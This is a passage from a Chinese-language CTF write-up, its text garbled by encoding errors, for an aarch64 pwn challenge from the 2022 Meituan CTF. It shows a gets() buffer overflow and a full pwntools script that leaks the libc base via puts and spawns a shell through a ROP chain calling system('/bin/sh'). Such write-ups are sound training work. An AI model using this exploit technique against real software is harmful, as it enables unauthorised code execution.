<p>leakå‡½æ•°åªè¦è¾“å…¥puts_gotï¼Œå°±å¯ä»¥ç›´æ¥æ³„éœ²libcåŸºå€ã€‚ä¸è¿‡è¦æ³¨æ„å› ä¸ºè¯¥æ¶æ„ä¸‹libcåœ°å€ä¸­æœ‰\x00å­—èŠ‚äº§ç”Ÿæˆªæ–­ï¼Œæ‰€ä»¥éœ€è¦åŠ ä¸Š0x4000000000ã€‚</p>
<br>

<pre><code>// overflowå‡½æ•°
__int64 overflow()
&#123;
  char s[128]; // [xsp+10h] [xbp+10h] BYREF

  printf(&quot;&gt; &quot;);
  gets(s);
  puts(&quot;Your Input: \n&quot;);
  puts(s);
  return 0LL;
&#125;
</code></pre>
<p>Leakå®Œåä¼šæœ‰ä¸ªoverflowå‡½æ•°ç”¨äºROPåˆ©ç”¨ã€‚è¿™é‡Œæˆ‘æ‰“ç®—ä½¿ç”¨çš„gadgetæ˜¯libcé‡Œçš„è¿™æ®µï¼ŒæŠŠ/bin/shçš„åœ°å€æ”¾å…¥x0ï¼Œsystemå‡½æ•°çš„åœ°å€æ”¾å…¥x30ï¼Œç„¶åretæ‰§è¡Œã€‚</p>
<p><img src="/images/2022%E5%B9%B4%20%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BE%8E%E5%9B%A2CTF%20Pwn%E9%A2%98%E5%A4%8D%E7%8E%B0/pic05.png" alt="pic05"></p>
<pre><code class="python">from pwn import *
context(os=&#39;linux&#39;, arch=&#39;aarch64&#39;, log_level=&#39;debug&#39;)

io = process(&quot;./pwn&quot;)
elf = ELF(&quot;./pwn&quot;)
libc = ELF(&quot;./libc.so.6&quot;)
puts_got =elf.got[&#39;puts&#39;]

io.sendlineafter(&quot;3.Exit.&quot;, &quot;1&quot;)
io.sendafter(&quot;sensible&gt;&gt;\n&quot;, p64(puts_got))
libc_base = u64(io.recv(3).ljust(8, b&#39;\x00&#39;)) + 0x4000000000 - libc.symbols[&#39;puts&#39;]
print(&quot;@@@ libc_base = &quot; + str(hex(libc_base)))

system = libc_base + libc.symbols[&#39;system&#39;]
binsh = libc_base + libc.search(b&#39;/bin/sh&#39;).__next__()
gadget = libc_base + 0x63e5c
io.sendlineafter(&quot;3.Exit.&quot;, &quot;2&quot;)
payload = b&#39;A&#39;*(128+8) + p64(gadget) + p64(0)*3 + p64(system) + p64(0) + p64(binsh)
io.sendlineafter(&quot;sensible&gt;&gt;&quot;, payload)
io.interactive()
</code></pre>
<p>åœ¨æœ¬åœ°æ‰“çš„æ—¶å€™ï¼Œä¸€å¼€å§‹æ²¡æ‰“é€šï¼Œè°ƒè¯•å‘ç°libcçš„åŸºå€ç«Ÿç„¶æ—¶0x55å¼€å¤´ï¼Œå°†expä¸­çš„0x4000000000æ”¹æˆ0x5500000000å°±å¥½äº†ã€‚éš¾é“æ˜¯ç¯å¢ƒæ²¡æ¨¡æ‹Ÿå¥½ï¼ŸğŸ¤”</p>
<br>

<h2 id="0x04ï¼šé¢˜ç›®é™„ä»¶"><a href="#0x04ï¼šé¢˜ç›®é™„ä»¶" class="headerlink" title="0x04ï¼šé¢˜ç›®é™„ä»¶"></a>0x04ï¼šé¢˜ç›®é™„ä»¶</h2><p>2022å¹´ç¬¬äº”å±Šç¾å›¢CTFpwné¢˜é™„ä»¶ï¼š</p>
<p>é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1paNMlzjTSinRXG7adwxDQA">https://pan.baidu.com/s/1paNMlzjTSinRXG7adwxDQA</a><br>æå–ç ï¼šlele</p>
<p class="textAlignRight"><span>â†¶ </span><a href="/">è¿”å›é¦–é¡µ</a><span></span></p></div></div></body><script src="/js/highlight.min.js"></script><script src="/js/main.js"></script><script src="/js/bootstrap/bootstrap.min.js"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', '');</script></html>